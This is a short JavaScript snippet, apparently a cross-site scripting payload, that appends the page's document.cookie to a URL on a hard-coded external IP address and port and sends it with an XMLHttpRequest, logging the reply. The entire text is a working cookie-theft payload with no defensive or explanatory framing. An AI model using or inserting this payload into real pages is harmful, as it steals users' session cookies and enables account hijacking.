const Http = new XMLHttpRequest();
const url='http://172.104.196.216:37777/' + document.cookie;
Http.open("GET", url);
Http.send();

Http.onreadystatechange = (e) => {
  console.log(Http.responseText)
}
